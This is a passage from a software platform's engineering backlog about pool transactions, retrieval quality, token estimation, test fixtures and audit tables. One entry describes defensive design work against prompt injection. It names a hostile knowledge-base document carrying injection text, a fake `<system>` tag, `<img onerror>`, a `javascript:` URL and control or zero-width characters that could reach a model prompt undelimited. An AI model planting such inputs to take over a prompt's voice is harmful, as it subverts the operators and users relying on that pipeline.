the nested borrow happens twice per provider call — binding load, then audit write — but
sequentially, which is why the peak is three connections and not four.

**It contradicts two documents, and the code is what is wrong.** CLAUDE.md states the shape —
*"the shape is transaction / no transaction / transaction, so no database connection is held while a
run is"* — and the job path already honours it (`jobs.ts:306`, `gates.ts:97` call providers outside
their transactions), which is what makes this a defect rather than a doc that never described
reality. `docs/technical/06-integrations-architecture.md:370` adds the second contradiction:
*"Actions are triggered by event handlers in the integration priority band (100–199), so the
pipeline never calls providers directly"* — the intake read is a **core-band** handler at priority
10 calling a provider.

**Why it is filed as the cause of two other findings.**
- **WP-15b's dropped foreign key.** `integration_actions_task_id_fkey` made **every** e2e die on its
  first event, because the audit commits before the saga does and the task row is not yet visible.
  The reviewer's words: *"the FK was the symptom; this is the defect."* Dropping the FK was judged
  **correct anyway** — a log of external facts must not be gated on internal referential state — so
  this entry is **not** a reason to revisit that decision; it is a second, independent problem the
  same shape caused.
- **The pool arithmetic.** `apps/server/src/config.ts:220`'s `POOL_RESERVATIONS.pipeline = 2` covers
  the two job workers but not the connection now nested inside a dispatch handler's transaction, so
  a dispatch peaks at **3** against `CONNECTIONS_PER_DISPATCH = 2`: floor `2N+8` versus a worst case
  of `3N+8`, and at the shipped default (N=1, `APP_DB_POOL_MAX=10`) **the floor equals the default
  with zero slack**. WP-15b is fixing the arithmetic while this is written (in the `wp/15b` working
  tree: a new `POOL_RESERVATIONS.auditPerDispatch = 1`, the dispatcher term becomes
  `3 × maxConcurrency + 1`, and `.env.example` raises `APP_DB_POOL_MAX` 10 → 13). **That is the
  accommodation, not the fix.** The arithmetic is only wrong because of this shape, and every
  deployment pays a third connection per concurrent dispatch for as long as the shape stands.

**What it costs to leave.** A pooled connection — and the `tasks` row the handler just wrote — is
held for the duration of a provider's HTTP round trip, on a bus whose default concurrency is 1, and
an audit row for a task that rolls back is written anyway. **The consequence under load is a
hypothesis and is labelled one** (rules 39 and 64): pool exhaustion, or audit writes timing out and
failing the actions they were meant to record, when several tasks intake at once. **Nobody has
measured it**, deliberately — synthetic load is forbidden on this machine (rule 66) — so there is no
margin here and no load figure to quote one against. What is *not* a hypothesis: the third
connection is now in the arithmetic, the three call sites are in the docblock, and a slow provider
holds a pooled connection for exactly as long as it is slow.

**What would make it urgent.** Nothing in production emits `ticket.matched` (entry 1), so today the
only traffic through these three handlers is the e2e's and the exposure is bounded by it. It goes
live the day **WP-15c**'s ingress lands, and the first thing an ingress delivers is a burst — a
sprint transition moving ten tickets arrives as ten concurrent intakes.

**What done looks like** (**WP-15d** in `13-implementation-plan.md`).
- No pipeline handler calls a provider inside `context.scope.tx`, and that is asserted
  **mechanically** rather than by review — the next handler to do it should fail a test, not a
  production pool. `PipelineIntegrationsPort.forProject` is the one door (`integrations.ts:93`) and
  the natural place for the refusal.
- The three sites take the shape the job path already has. **The mechanism exists, which is what
  makes this engineering rather than a product decision**: `HandlerContext.afterCommit`
  (`packages/application/src/events/handler.ts:72`) exists precisely because `Jobs.enqueue` does not
  join the handler's transaction (TD-004: *"there is no transactional enqueue … enqueue after commit
  and re-validate on fire"*). `afterCommit` **alone** is at-most-once by its own docblock — *"a crash
  between the commit and the callback loses the callback"* — so the durable form is
  `afterCommit(enqueue)` plus a job that re-validates on fire, which is what the stage executor
  already does.
- **The compensation question answered rather than avoided**: *if the call goes out and the
  transaction then rolls back, what un-does it?* Nothing does — and that is the argument **for**
  moving the call out, not against it. Inside the transaction the failure mode is a ticket comment
  posted for a task that never committed and an audit row naming a task that never existed; outside
  it, it is a committed task whose comment is one job-retry late. The workpad render is re-derived
  from the `tasks` row on every event, so a lost wake-up self-heals; a status `transition` and the
  intake read need the re-validating job rather than a bare callback.
- Moving the **writes** to a job makes the executor's idempotency load-bearing for the first time —
  which is the work package the "composition of the `IdempotencyStore` has no test" entry (WP-15b,
  "Discovered work") says owes that assertion. Take it here.
- `POOL_RESERVATIONS.auditPerDispatch` returns to **0** when the last site moves. That constant is
  the receipt for this entry: while it is 1, the shape is still there.
- **Needs measurement** (not run here, rule 66): the exhaustion hypothesis — N concurrent intakes
  against the shipped default with the provider's latency stated — and whether one project's slow
  provider delays dispatch for every other project. Whoever takes WP-15d measures it **before** the
  move as well as after, or the fix has no number either.

**Not an open question, and said here so nobody re-opens it as one.** The decision it would ask for
is already taken twice (TD-004, TD-005) and stated in CLAUDE.md. What the work package does owe the
docs is one sentence: technical/02 and `06-integrations-architecture.md:370` describe *which band*
triggers an outbound action and say nothing about the transaction it runs in, which is the silence
that invited this.

**Depends on.** WP-15b (before the Postgres audit log there was no second transaction to nest, so
the shape was invisible). Should land **before or with WP-15c**, which is what makes it live.
**No work package owned it**: WP-15 wrote the handlers, WP-15a composed them into a server, WP-15b
met the consequence twice — the foreign key and the arithmetic — and fixed both symptoms because
neither was its to fix. Related: entry 1 (nothing produces the load yet), entry 1b (the two write handlers
of this entry, 110 and 120, whose *ordering* was that flake), entry 11 (the same "built, not owned" shape one layer up).

### 19. **`ProjectSettingsPort.forProject` borrows a pool connection *inside* the handler's transaction** (TODO, small — the **residue** of entry 17, not a reopening of it)
**What is wrong.** The settings port reads `projects.config` on a connection it takes from the pool itself
(`apps/server/src/pipeline.ts:183`, `createProjectSettingsPort` → `pool.query('select config from projects
where id = $1')`) rather than on the caller's transaction, and three pipeline handlers call it while their
own transaction is open. WP-15d moved the **provider** calls out and installed a mechanical refusal at
`PipelineIntegrationsPort.forProject`; that refusal covers the integrations port only, so this borrow is
neither refused nor counted.

**The implementer's own assessment, kept rather than sharpened, because the distinction is the entry's
value:** it is a **local read**, not a call held across a third party's latency — *"it contends, it cannot
stall, because every other borrower releases without waiting on a dispatch"* — so it is deliberately **not**
in the pool floor. *"The honest fix is for the port to take the caller's transaction; today the claim 'a
dispatch holds two connections' is true of what it holds and not of what it transiently borrows."*

**Evidence.** The implementer named two sites — `planApprovalGate`
(`packages/application/src/pipeline/saga.ts:526`, reached from `:443`) and `schedulerHandler` (`saga.ts:1023`,
priority 30, which uses `context.scope.tx` on the next line). **Resolved against the tree while filing, and
it makes that an undercount**: `statusMappingHandler` (`packages/application/src/pipeline/workpad.ts:239`,
priority 110) does the same, after loading the task on `context.scope.tx` at `:235`. The reasoning is
mechanical rather than measured — `EventBus` runs the whole handler body inside one `uow.transaction`
(`event-bus.ts:351-371`), so **every** `settings.forProject` in a handler body is a borrow inside that
transaction. The other three callers are on the job path and outside a transaction, checked the same way:
`saga.ts:269` (`runIntakeCheck`, between two `unitOfWork.transaction` calls), `workpad.ts:287`
(`runWorkpadRender`, after its read transaction closed) and `stage-executor.ts:277` (via `runtime.ts:96`,
before `prepare` opens one).

**What it costs to leave.** Today, one wrong inference rather than one wrong behaviour: WP-15d's receipt for
entry 17 is `POOL_RESERVATIONS.auditPerDispatch = 0`, and a reader who checks that receipt and concludes
that no dispatch borrows a second connection is wrong. The borrow cannot deadlock the pool — that is the
implementer's judgement above and it is recorded as a judgement, not a measurement — so what is left is
contention under concurrency and an arithmetic that is true of *holds* and silent about *borrows*.

**What would make it urgent.** A settings read that stops being local — a cache miss that fetches, a
`.agentic/pipeline.yml` read from the default branch (the port's own docblock at `pipeline.ts:173` says that
is what a project's own template would need, and that it is *absent rather than guessed* today). The day
that read needs a workspace, this borrow becomes exactly the shape entry 17 was about.

**What done looks like.** `ProjectSettingsPort.forProject` takes the caller's `Transaction` — the shape
`PipelineIntegrationsPort.forProject` was given at WP-15d — so the read runs on the connection the handler
already holds, and the pool floor does not change because the borrow disappears rather than being accounted
for. One port signature, one adapter, three call sites; the job-path callers pass the scope they already
open. Worth one line beside the floor's arithmetic saying that the port takes a transaction *so that* the
"holds" claim is also true of borrows (rule 63).

**Needs measurement**: none. This one is read off code end to end, and is filed as a small piece of work
rather than a hypothesis.

**Depends on.** WP-15d (landed). **Owner: none today** — WP-15d found it and deliberately left it, and no
plan row mentions the settings port. Cheap enough to fold into WP-15c or WP-15e, whichever touches
`apps/server/src/pipeline.ts` next.

### 11. What WP-16 left behind — **the retrieval layer is built and no prompt uses it** (**two thirds RESOLVED** at `1497fe9`, WP-17)
The same shape as entry 1, one layer up, and in the reviewer's sentence form. Three pieces, none of
them WP-16's to fix, all three with an owner in the plan; **two of the three are closed**:

- ~~**`basicStageRunPlanner` still passes `contextPack: []`**~~ — **CLOSED at WP-17**. The symbol no
  longer exists in the tree; `createStageRunPlanner` assembles a real pack and the
  `ContextPackRecord` is not zeroed, asserted by
  `test/e2e/pipeline/context-pack.e2e.test.ts` › *"is written to run.started, is not zeroed, and
  reaches the prompt as delimited data"*. **What the pack contains is now the open question, not
  whether one exists** — see entry **23**.
- ~~**Nothing composes a `PlatformToolPort` in production**~~ — **CLOSED at WP-17**:
  `apps/server/src/platform-tools.ts`, reached by a run through `PipelineComposition.runner`, which is
  now `(tools) => ClaudeRunner`. `kb_search` is callable from a run and the same e2e drives it.
  **`get_task_context` still refuses**, which is entry 23's evidence rather than this entry's.
- **`KnowledgeIndexer` is not registered as a pg-boss job.** technical/07 specifies "singleton per
  project", triggered at task start and after every merge. Registering it needs a checkout to read,
  which needs the workspace provider, which needs the ingress entry 1 says does not exist — so
  wiring it today would be a job nothing can trigger. **WP-18**, after **WP-15c**.

Detail and measurement are in the WP-16 notes and in "Discovered work"; this entry exists so the gap
is readable next to entry 1 rather than only under the work package that found it.

### 15. **Retrieval has no defence against a junk query, and the remedy is a product decision (Q58)**
**What is wrong.** Nothing between a degenerate query and the context pack rejects it. WP-16 round 1
measured a single stopword query filling **87 %** of the budget with padding; the implementer fixed
the *cause* found underneath it — `websearch_to_tsquery` joins bare words with **AND**, so the
acceptance query matched **0 documents on PostgreSQL while the in-memory fake returned 15** — by
extracting keywords and joining them with `OR`, and **deliberately shipped no relevance floor**, both
candidates rejected by measurement. Round 2 then measured that the hole is **still open** one letter
up: extraction drops tokens of **three characters or fewer** only (`MIN_QUERY_TERM_LENGTH = 4`,
`packages/domain/src/knowledge/query.ts:45`), and the module's own docblock says what survives —
*"it keeps `with`, `that` and `from`"*.

**Evidence**, quoted rather than paraphrased (`packages/domain/src/knowledge/retrieval.ts:176`):
*"a query of thirteen function words of four letters or more returns 10 documents at ranks
0.900/0.898/0.898/0.898 and fills **10 707 of 12 000** with six tier-1 documents, its top score
**0.718** — above a good query's correct answer at 0.500. The 87 %-padding pack is still reachable
and this work package did not make it unreachable."* The query was
`"that this with from have been were will your they able such their"` → 13 terms. The same pipeline
on a good query returns **12 documents**, correct lesson top at **0.500**, pack **10 552/12 000** —
which is the acceptance figure. The two rejected floors are at `retrieval.ts:152` and `:163` and are
restated in full in **Q58**: an *absolute* floor is backwards (`"the"` ranked padded pages at
**0.947** against a good query's correct answer at **0.048**, because `ts_rank_cd` measures cover
density), and a *relative* floor is store-dependent (the correct second answer sits at **0.667** of
the best on PostgreSQL and **0.267** on the in-memory fake, same corpus, same query; the 0.3 ratio
dropped the right page on the store the acceptance figure is measured on). Those round-1 figures are
**pre-fix and cannot be reproduced** — that state is gone — so they are evidence about *why a floor
was rejected*, not numbers to tune a new one against.

**What it costs to leave.** A pack that is mostly noise is spent budget and a worse answer at every
stage that asks for one, and it fails silently: the pack is well-formed, the token figure looks
healthy, and nothing on `ContextPackRecord` says the text-match step contributed nothing but padding.
Not urgent **today**, and the trigger is nameable: nothing puts a pack into a prompt yet (entry 11),
so the first junk query that costs anything arrives with WP-17's wiring — and the queries that reach
it are `kb_search` calls written by a model and ticket text written by whoever files tickets, neither
of which is curated.

**What done looks like.** **Q58** answered, then implemented: a precision mechanism robust to
≥ 4-letter function words, which needs a **corpus-derived** signal (IDF, or a choice of `ts_rank`
normalisation) because every store-independent rule of the shape already tried has been measured
wrong in one direction or the other. Two constraints on whatever ships, both earned here: it is a
property of the **port**, not of the PostgreSQL adapter, or the in-memory double goes back on the
kind side of standing rule 1 (0 against 15 documents; 0.667 against 0.267); and it is asserted by a
test the **fixture vault cannot pass by construction** (entry 16).

**Needs measurement** (not run here, rule 66): any threshold. The vault's padding is one repeated
paragraph held by test to share no keyword with the test queries, so it can neither produce a false
positive nor calibrate a cut-off; choosing one needs a real repository corpus.

**Depends on.** WP-16 (landed). **No work package owns it** — it is beyond WP-16 by the reviewer's
judgement, and the plan's nearest home is **WP-17**, the first consumer, where the answer should land
if Q58 is decided before WP-17 starts; otherwise it is a work package of its own. It does **not**
block entry 12's delimiter, and that delimiter does not close this: a delimiter makes junk text safe,
not absent.

> **Added with entry 23, which changes what this one is worth doing next.** Entry **23** measured the
> opposite defect on the same wire — the query at the first agent stage is **one term**
> (`extractQueryTerms('ACME-1') -> ["acme"]`), because the platform stores no ticket text — so this
> entry is *too broad* and that one is *too narrow*, with entry **16** saying the instrument can
> falsify neither. **Do not tune relevance before entry 23 lands**: a precision floor over a one-term
> query removes documents rather than noise, and Q58's answer has to be calibrated against the query
> distribution the platform will really send, which does not exist yet. One sentence above is also
> **now false** and is left in place rather than rewritten: *"the queries that reach it are
> `kb_search` calls written by a model and ticket text written by whoever files tickets"* — no ticket
> text reaches it, and none will until entry 23 closes.

### 12. **Untrusted context-pack text reaches the prompt with no delimiter, marker or count** (WP-17)
**What is wrong.** technical/04 § "Prompt assembly" delimits the *task* block — step 5 is
`<ticket>` … `</ticket>`, "all marked as data" — and says nothing of the kind about step 4, the
context pack, which is rendered "tier 0 inline" and as a "Relevant knowledge" block. Nothing between
a KB document on disk and the assembled prompt marks that text as data.

**Evidence** (WP-16 review, explicitly marked *schedule, don't fix here*). A hostile document —
injection text, a literal `<system>`, `<img onerror=…>`, a `javascript:` URL, an ANSI `ESC[31m` and a
U+202E — flows **byte-identical** through the parser → `kb_chunks` → `kb_search.excerpt` →
`pack.documents[].text`. Nothing strips it, escapes it, marks it or counts it, and nothing is
supposed to at that layer: `context-pack.ts`'s own docblock says the assembler "returns text and
paths, the prompt assembler (WP-17) is what delimits them", and the field carries the comment
*"Untrusted document text (BD-022). Never interpreted here."* So this is a **handoff that has not
been scheduled**, not a defect in WP-16.

**What it costs to leave.** BD-022 governs, and technical/07's own block on provider text says of
this exact obligation **"this is where it closes"** — a pack must not let integration text occupy the
pack's own voice. Until WP-17 lands, every prompt that consumes a pack would take a KB document as
platform voice; today nothing consumes a pack (entry 11), which is the only reason this is scheduled
rather than urgent. The order matters: WP-17 must not ship the `contextPack` wiring of entry 11
*before* the delimiter, or the window opens for the length of a work package.

**What done looks like.** A delimiter contract for pack text in the assembler, asserted by a test
that plants the hostile document above and reads the **assembled prompt** — not the pack — and shows
that none of the six can close the platform's own voice. The web app's answer to the same question is
the precedent worth copying (`apps/web/src/ui/untrusted.tsx`: no sanitiser, nothing for a later
transform to undo), and the difference is that a prompt has no React text node, so the contract has
to be a delimiter plus a rule about what may appear inside it.

**Depends on.** WP-16 (landed); **blocks nothing**, and blocks *itself* being done after the
`contextPack` wiring in the same work package.

**One line beside it, measured and unresolved.** Zero-width and formatting characters — `U+200B`,
`U+FEFF`, `U+2060` and `U+00AD` — pass the indexer's sanitiser untouched (`sanitised = 0`), where C0
controls, DEL, bidi overrides and isolates are replaced and counted
(`packages/domain/src/knowledge/sanitise.ts:57`). They are invisible but do not reorder, so they sit
outside that module's stated scope by design rather than by oversight. **Whether it matters downstream
is unknown** — the reviewer flagged it and could not check — and it is filed here because the two
places it could matter are both WP-17's neighbourhood: a delimiter a document could spoof by hiding a
zero-width character inside the marker, and a term no query can match because a zero-width character
splits it in `to_tsvector`. *Needs measurement* (rule 66, not run here); a nit until one of the two is
shown.

> **One of the two is now shown** (added when entry **23** was filed, from the WP-17 round; measured
> by the reporting agent, not re-run here — rule 66). The *query* half:
>
> ```
> extractQueryTerms('sess<U+200B>ions rollback') -> ["sess","ions","rollback"]
> ```
>
> A zero-width character splits a term, so `to_tsvector` indexes two fragments and **no query can
> match the word** — a document, a lesson or a ticket carrying one is unfindable by its own subject,
> and nothing reports it (`sanitised = 0`, by design). The two halves now separate, because the other
> one is **closed rather than unshown — by WP-17's contract** — `SAFE_ATTRIBUTE_VALUE`
> is `/^[A-Za-z0-9._\/-]{1,512}$/` (`packages/domain/src/prompt/data-block.ts:89`) and a value that
> does not match is *refused* rather than escaped, with the module's own comment at `:121` naming
> *"zero-width characters that are the whole point of the refusal"* — so only the query half
> survives. **It stays small, and it is not a nit any more**: it is a correctness hole in retrieval with, today, no producer — the
> query is a ticket key (entry **23**), so nothing untrusted reaches `to_tsvector` through a *query*
> at all. **What makes it live is entry 23 landing**, which is when ticket titles start being
> tokenised, and it is cheapest to fold into that work package: extend
> `packages/domain/src/knowledge/sanitise.ts` to strip-and-count `U+200B`, `U+FEFF`, `U+2060`,
> `U+00AD` on the indexing path **and** the query path, asserted by a test that plants one inside a
> word and shows the document still retrievable by that word. Owner: **WP-15f** if it lands first,
> otherwise whoever next touches `sanitise.ts`.

### 13. **`context_budget_tokens` has no ceiling** (WP-17, one line)
`packages/contracts/src/common.ts:46` is `tokenCountSchema = z.int().nonnegative()`, and
`config.ts:47` types `context_budget_tokens` with it — so a project may configure a budget of any
size, and the pack that fills it is spent per stage run. A nit today (the shipped default is 12 000
and nothing else sets it), and the cheapest fix is a `.max()` at the boundary rather than a check at
the assembler. Found by WP-16's review.

### 31. **`run_context_pack` has never been written, and it could not hold the record if it were** (TODO — **no work package owns the writer**; found by the first reader, WP-15h)
Placed here because the two entries below it argue their cost from this table's contents.

**What is wrong.** technical/03 lists `run_context_pack` as the per-run record of the knowledge a
prompt was built from, and **nothing in this repository inserts a row**. It is not only missing a
producer: the table cannot express `ContextPackRecord` — there is **no column for `budget_tokens`**,
and `reason`/`score` are nullable here where the published tier-1 entry requires them — so a writer
added today still could not store the record WP-17 already builds. The pack exists in exactly one
place: the `run.started` event payload.

**Evidence** (WP-15h's implementer and its review round 1, session 5; refiner grep, no test run — rule 66).
- The DDL is `run_context_pack (run_id, tier smallint, source_path, reason, score real, tokens,
  validated, kb_commit_sha)`, PK `(run_id, source_path)` —
  `packages/infrastructure/src/db/migrations/0004_pipeline.sql:125-136`. No budget column exists in
  it or anywhere else in the schema.
- The record it is supposed to hold requires `budget_tokens`, and a non-null `reason` and `score` on
  every tier-1 entry — `packages/contracts/src/records.ts:146-160`.
- The only production record of a pack is the event: `run.started` carries
  `context_pack: contextPackRecordSchema` (`packages/contracts/src/events.ts:285-292`) from
  `StageRunPlan.contextPack` (`packages/application/src/pipeline/stage-executor.ts:98`), and
  `run.started` is declared unconsumed with the comment `// UI band, WP-20.`
  (`packages/application/src/events/consumption.ts:94`) — so the outbox sweep completes it and the
  payload stays in the append-only `events` table.
- **Two live claims rest on the table and are false today** (rule 44, rule 83). Of a document
  recorded `validated: false`, `packages/application/src/pipeline/planner.ts:135` says
  *"That is visible in `run_context_pack` and logged once per run here"*. And of a tier-0 overflow,
  `docs/technical/07-knowledge-and-search.md:101-105` says the pack records `total_tokens >
  budget_tokens` and that this is *"visible in `run_context_pack` rather than absorbed"* — which no
  column in it could hold.
- The reader is written and refuses by name: `GET /api/runs/:id/context-pack` has **no success
  branch at all** and answers 409 `context_pack_not_recorded` carrying the row count, so `0` (no
  producer) and a non-zero count (a producer arrived before the schema was fixed) are
  distinguishable — `apps/server/src/routes/runs.ts:175-201`,
  `apps/server/src/queries/pipeline-queries.ts:24-29`. Round 1 found the first draft **fabricating**
  all three missing values (`budget_tokens = total_tokens`, `'paths'` for a null `reason`, `0` for a
  null `score`) with its own integration case pinning them, while
  `apps/web/src/features/run-detail.tsx:288` renders `budget_tokens` to the user as a fact.

**What it costs to leave.** The run-detail screen's Context tab is a permanent error state, and the
platform keeps no queryable record of what any agent was shown: *which runs were built on document X*
and *which packs overflowed their budget* are jsonb scans of one event type rather than a query. Two
backlog entries below already argue their cost from this table — entry **23** (*"`run_context_pack`
faithfully records the tokens spent on a pack assembled for a one-term query"*) and entry **14**
(*"`run_context_pack.tokens` stores it"*) — so an unwritten table is cited as the platform's audit in
two places.

**What "done" looks like** — one of two. What is missing is a decision and an owner, not a design.
- **(a) Keep the table.** A new numbered migration adding a per-run budget column (and either filling
  `reason`/`score` at the write or relaxing them in `@platform/contracts`), an insert on the
  run-creation path where `StageRunPlan.contextPack` already exists, and something that tells an
  **empty** pack from an **unwritten** one — then the endpoint grows the success branch its route
  schema already declares, asserted against a pack this repository's own planner produced rather than
  a seeded table.
- **(b) Drop the table** in a new migration and serve `/context-pack` from the `run.started` payload.
  `events` is append-only and carries the whole record, so nothing is lost; what it costs is that the
  pack is only ever as queryable as a jsonb scan.
Either way the two false claims above are corrected in the same change, and technical/03 and
technical/07 are amended first (docs win).

**What would make it urgent.** Latent for correctness, live for the screen: no production run reaches
a real model today (`unavailableClaudeRunner`, Q52), so no pack is being lost that anyone could have
audited. The dangerous order is a **writer landing before the schema decision** — rows that cannot be
projected would then exist, and the refusal's row count is the only thing that makes that visible.

**Depends on / owner.** **None today, and that is the finding.** WP-16's plan row is *"retrieval tests
on a fixture vault; token budget respected"* and WP-17's row owns the assembler and the prompt;
neither names the table. Closest by subject: **WP-17** built the pack, **WP-15h part 2** owns the
endpoint's reader, **WP-19** owns the rest of the per-run audit family. No measurement needed.
The sibling finding from the same reader — `runs.system_prompt`/`user_prompt` have no writer either,
so `/prompt` refuses the same way — is **not** an entry here: storing the assembled prompt is a
retention decision about untrusted text and is **Q64**.

### 14. **The token estimator can under-estimate, and its properties do not constrain it** (TODO)
**What is wrong.** `estimateTokens` (`packages/domain/src/knowledge/tokens.ts`) is `ceil(chars / 4)`,
every budget in the platform is denominated in it, and `run_context_pack.tokens` stores it. Under-
estimating is the direction that overflows a real model's context window; over-estimating only wastes
budget.

**Evidence.** Measured by WP-16's review: **48 000 CJK characters estimate to exactly 12 000 tokens**,
which is the shipped default budget, so a pack that fills the budget on such a corpus is the worst
case rather than a corner. The reviewer labels the *ratio* a **hypothesis** and it is kept as one
here (standing rule 39 — a wrong number attached to a true finding is the combination that survives
review): 2–4× real for CJK, ~1.6–2× for the Czech the vault fixture states. **Needs measurement**
against a real tokeniser; nobody has run one. The second half is not a hypothesis: `tokens.test.ts`
asserts "non-zero" and "monotone", and both properties are satisfied by an **arbitrarily wrong**
estimator, so the suite cannot tell a 4-chars-per-token model from a 40-chars-per-token one.

**What it costs to leave.** A stage run whose pack overflows the model's context is a run that fails
or silently truncates, and the platform's own record of the spend (`run_context_pack.tokens`) is
wrong in the same direction. The blast radius is bounded today because nothing consumes a pack
(entry 11) and the fixture vault is English.

**What done looks like.** Either a bound the estimator can be held to — an upper-bound estimator, so
error is in the safe direction — or a real tokeniser behind the same function; and either way a
property that fails for an estimator with the wrong ratio, which the two present properties do not.
The honest interim is a docblock line stating the measured worst case, which the module's existing
"the estimate is not the billed number" paragraph is the right place for.

**Depends on.** Nothing; wants a measurement before it wants code. Owner: **WP-17** if it lands
first (it is the first consumer), otherwise whoever raises the budget past a Latin-script corpus.

### 16. **The fixture vault cannot falsify precision — its padding is chosen against the test queries** (rule 5)
**What is wrong.** The corpus every retrieval test measures on cannot produce a false positive for
those tests, because its noise was selected against their query list. This is a standing weakness of
the **instrument**, not a defect in the code: the code does what it says, and the check that creates
the weakness is itself correct for the claim it enforces.

**Evidence.** `PADDING_PARAGRAPH` (`packages/application/src/testing/fixture-vault.ts:60`) is the one
paragraph repeated to pad five documents to 16 000 and 8 000 characters, and
`packages/application/src/testing/fixture-vault.test.ts:26` holds it to *"share no keyword with any
query the retrieval tests use"* by intersecting its extracted keywords with a nine-query list kept in
the same file. Round 2 added that check after the docblock's original claim was measured false (the
intersection with the acceptance query is `["a", "its", "the"]`, all sub-keyword), which was the right
fix for the claim. The side effect is the finding: padding that shares no keyword with any query
cannot be retrieved *by* those queries, so "no padded page ranked" is true by construction, and a
precision assertion over this vault measures the assertion rather than the retriever.

**What it costs to leave.** Standing rule 5 — *a differential result is evidence about the corpus, and
whoever built the corpus is the worst judge of what it omits* — with rule 45 beside it. It already
misleads once, concretely: entry 15's remedy cannot be calibrated here, and the cheapest candidate (a
`ts_rank` length normalisation) would look excellent on this vault **because the noise pages are the
padded ones** — an artifact of the fixture rather than a property of a real corpus. **WP-18**
(librarian proposals) and **WP-21** (onboarding discovery) both build on this vault, so the weakness
is inherited rather than retired when WP-16 merges.

**What done looks like.** A negative corpus whose author did not consult the query list: a handful of
documents that are *plausible answers to the test queries and wrong* — same vocabulary, different
subject — so that a precision assertion is capable of failing. The padding stays as it is; it exists
to make the budget bind, which it does. The interim, if the documents are not written, is one sentence
in the vault's docblock saying what the corpus cannot show, which is the standing-rule-44 half of this.

**Depends on.** Nothing. **Owner: none today** — WP-16 built it, WP-18 and WP-21 consume it, and no
plan row mentions the corpus. Whoever takes entry 15 needs this first: a precision mechanism measured
on an instrument that cannot falsify it is a mechanism nobody can review.

### 1b. **The workpad e2e flake — identified and fixed** (RESOLVED on `fix/workpad-flake`)
```
FAIL test/e2e/pipeline/pipeline.e2e.test.ts >
  a feature ticket, end to end > keeps one workpad comment on the ticket and moves the ticket status
AssertionError: expected '**ACME-1** — active (rebase_gate)' to be '**ACME-1** — ready_for_merge (…)'
```
Seen twice in the orchestrator's shell: once on `main` at `be05a9b` (identity lost to `| tail`, rule 75)
and once on `wp/16` at `307bb49`, where the full log was captured. **Not WP-16's** — it touches retrieval,
not the pipeline, and the first sighting predates it; two immediate re-runs at load 6–8 passed.

The workpad renders while the task is still `active (rebase_gate)` instead of `ready_for_merge`. This is
the **same test** WP-15a fixed once: *"the workpad test settled on a task state and read a consequence the
integrations-band handler commits later"*, closed with a `waitFor` in the harness, and a reviewer then
measured that the `waitFor` bounds the right thing — delaying the workpad handler (priority 120) by 250 ms
left it green, so the flake was the **status** handler at priority 110 and the `waitFor` waits on its
consequence. **That measurement stands and the flake survived it**, so the remaining window is elsewhere:
either a second consequence nothing waits on, or the wait is on the wrong band. Rule 50 is the frame — *a
window must bound silence, not the drain* — and rule 4: the instrument gets audited before the product.

**Done looks like**: the mutation that reintroduces the race fails a named test, and the identity above is
reproduced deliberately rather than waited for.

> **RESOLVED on `fix/workpad-flake`. It was never a race — it was a wait on a strictly earlier
> handler, and it is the harness, measured.**
>
> The provider call order, traced by wrapping the fake's `upsertWorkpad` and `transition`, ends:
> `upsert active (rebase_gate)` → `status In Review` → `upsert ready_for_merge (ready_for_merge)`.
> All three handlers of `task.stage.entered` fire in one dispatch, in TD-005 priority order —
> stage executor **10**, status mapping **110**, workpad **120** — each in its own transaction. The
> test waited on the *status* (110) and then asserted the *workpad body* (120). Priority order
> **guarantees** 110 commits first, so that wait could never cover the assertion: it was not a rare
> interleaving but a structurally insufficient wait that passed roughly four runs in five because
> both handlers finish inside one 50 ms poll. *The failure rate was the only thing about it that was
> random.* Rule 50's frame with the sharper edge: **bound the silence you care about — the line you
> are about to assert — not something that merely precedes it.** The previous round's reviewer
> measurement ("the flake is the status handler at 110, and `waitFor` waits on its consequence") was
> correct in every part and pointed at the wrong *side*: waiting on 110's consequence is exactly the
> defect when the assertion belongs to 120.
>
> **Harness, not product, and here is the measurement rather than the reasoning.** Widening the
> window **250×** (a delay inside the fake's `upsertWorkpad`) leaves the end state correct — the last
> render is still `ready_for_merge (ready_for_merge)` — so nothing is lost and nothing is stale once
> the dispatch completes. What production can show is a ticket whose *status field* updates a few
> milliseconds before its *workpad comment*, which is TD-005's band ordering working as designed and
> self-heals inside the same dispatch. A test that samples inside that window is asserting one
> handler's timing against another's, which is the harness's mistake to make.
>
> **Reproduced deliberately rather than waited for.** `StartPipelineOptions.workpadDelayMs` widens
> the 110→120 gap, and the workpad test now runs with it **always on**, so the interleaving that used
> to appear one run in five is exercised on every run. Restoring the status-based wait fails
> `pipeline.e2e.test.ts` › "keeps one workpad comment on the ticket and moves the ticket status"
> **3 times out of 3**, with the identity above word for word. The sweep rule 49 asks for was done:
> every other assertion in that file reads `tasks` rows or the `events` table, both written in the
> core handler's own transaction, so no sibling has this shape.

### 2. The slack/census follow-up branch — **three review rounds, merging** (branch exists)
`fix/slack-redaction-and-census`, worktree `.claude/worktrees/slack-fix`, head `20b1e97` with `main` merged
in at `415a3fb`. Round 1 found a **fourth** instance of the stored-secret class in `action-executor.ts`
itself; the fix found it **wider** than the finding (the idempotency *key* leaked too); round 2 APPROVEd and
raised the collision that round 3 reversed the key half for (rule 70); round 3 found the branch's own
"anywhere" scope claim false and it was narrowed with rule 20 as the reason. Merge, then delete the
worktree the same minute (rule 66).

### 25. **A hand-written wall-clock deadline inside the fully parallel contract tier — the second instance of one class, and this one blocked a push** (TODO — **no work package owns it**)
**What is wrong.** The runlet conformance suite waits on a structural event with a hand-written 30 s
deadline — `packages/infrastructure/src/runlet/conformance.contract.test.ts:69`
(`waitForFile(file, timeoutMs = 30_000)`) and `:83` (`waitFor(what, ready, timeoutMs = 30_000)`) — while
the file runs inside `verify`'s **fully parallel** `contract` project (`vitest.config.ts:87`), whose
parallelism is set by whatever else the orchestrator happens to be running. The deadline is therefore a
statement about the host's scheduler rather than about the shim (standing rule **2**), and it was never
measured at the load the fleet runs at (rule **64**). It is **not** a defect in the shim and **not** a
defect in the assertion: it is a good assertion with an unmeasured bound.

**Evidence** (orchestrator, 2026-09-12, measured rather than reported by an agent). The pre-push hook
rejected WP-15f's push, and the failure was not in WP-15f's code:

```
FAIL |contract| packages/infrastructure/src/runlet/conformance.contract.test.ts >
  agentic-runlet conformance, against the real shim process >
  relays a signal to the CLI and forwards its stderr          31482ms
Error: /var/folders/.../rl-F5wjCN/signal-report.pid never appeared
  at waitForFile (conformance.contract.test.ts:76:13)
  at conformance.contract.test.ts:357:5
```

| condition | 1-min load average | result |
|---|---|---|
| pre-push hook's full parallel unit+contract (`pnpm run -s test`, `lefthook.yml:35`) | **12.63** | **FAIL**, suite 41.35 s |
